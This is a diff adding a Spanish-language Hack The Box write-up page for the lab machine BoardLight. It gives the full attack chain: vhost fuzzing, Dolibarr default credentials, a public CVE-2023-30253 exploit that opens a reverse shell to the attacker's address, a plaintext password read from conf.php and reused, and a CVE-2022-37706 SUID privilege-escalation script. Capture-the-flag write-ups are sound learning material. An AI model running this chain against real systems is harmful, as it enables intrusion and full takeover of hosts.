@@ -1,0 +1,124 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | BoardLight HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/boardlight/pasted-20260403144302.png" alt="BoardLight HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>BoardLight</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>dominio</span>
+            <span>vhosts</span>
+            <span>SUID</span>
+            <span>Dolibarr</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Fuzzing de vhosts para descubrir <code>crm.board.htb</code> con Dolibarr</li>
+            <li><code>Explotación</code>: Credenciales por defecto y exploit para Dolibarr 17.0.0</li>
+            <li><code>Movimiento lateral</code>: Fichero de configuración expone credenciales reutilizables para <code>larissa</code></li>
+            <li><code>Escalada de Privilegios</code>: Binario SUID vulnerable asociado a Enlightenment</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/boardlight/pasted-20260403144251.png" alt="BoardLight HTB" />
+          <div class="code-card">
+            <h3>Fuzzing subdominios vhosts</h3>
+            <pre><code># Enumerar dominio desde la web
+# Fuzzear vhosts
+gobuster vhost -u http://10.129.21.255 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --domain board.htb --append-domain
+# VHOST: crm.board.htb</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/boardlight/pasted-20260403161728.png" alt="BoardLight HTB" />
+          <img class="writeup-image" src="/writeups/assets/boardlight/pasted-20260403161916.png" alt="BoardLight HTB" />
+          <div class="code-card">
+            <h3>Credenciales</h3>
+            <pre><code># Credenciales por defecto -&gt; admin:admin</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/boardlight/pasted-20260403163203.png" alt="BoardLight HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <div class="code-card">
+            <h3>Buscar exploit en github</h3>
+            <pre><code># Dolibarr 17 vulnerabilities</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/boardlight/pasted-20260403163116.png" alt="BoardLight HTB" />
+          <p><a href="https://raw.githubusercontent.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/refs/heads/main/exploit.py">PoC de GitHub</a></p>
+          <div class="code-card">
+            <h3>Exploit</h3>
+            <pre><code># Listener
+penelope -p 443
+# Exploit
+python3 exploit.py http://crm.board.htb admin admin 10.10.16.69 443</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/boardlight/pasted-20260403162846.png" alt="BoardLight HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral</h2>
+          <div class="code-card">
+            <h3>Buscar fichero de configuración desde la ruta de la web /var/www/html</h3>
+            <pre><code>find . -name \*conf\* 2&gt;/dev/null
+# ./crm.board.htb/htdocs/conf</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/boardlight/pasted-20260403171402.png" alt="BoardLight HTB" />
+          <div class="code-card">
+            <h3>Ver contenido</h3>
+            <pre><code>cat /crm.board.htb/htdocs/conf/conf.php</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/boardlight/pasted-20260403171555.png" alt="BoardLight HTB" />
+          <div class="code-card">
+            <h3>Reutilizar credenciales para el usuario larissa</h3>
+            <pre><code>su larissa
+# Password: serverfun2$2023!!</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/boardlight/pasted-20260403171733.png" alt="BoardLight HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: SUID</h2>
+          <div class="code-card">
+            <h3>SUID</h3>
+            <pre><code>find / -perm -4000 2&gt;/dev/null </code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/boardlight/pasted-20260403173442.png" alt="BoardLight HTB" />
+          <img class="writeup-image" src="/writeups/assets/boardlight/pasted-20260403173504.png" alt="BoardLight HTB" />
+          <p><a href="https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/refs/heads/main/exploit.sh">PoC de GitHub</a></p>
+          <div class="code-card">
+            <h3>Exploit de GitHub</h3>
+            <pre><code>chmod +x exploit.sh
+bash exploit.sh</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/boardlight/pasted-20260403174334.png" alt="BoardLight HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>dominio</span>
+            <span>vhosts</span>
+            <span>SUID</span>
+            <span>Dolibarr</span>
+            <span>find</span>
+            <span>conf</span>
+            <span>enlightment</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
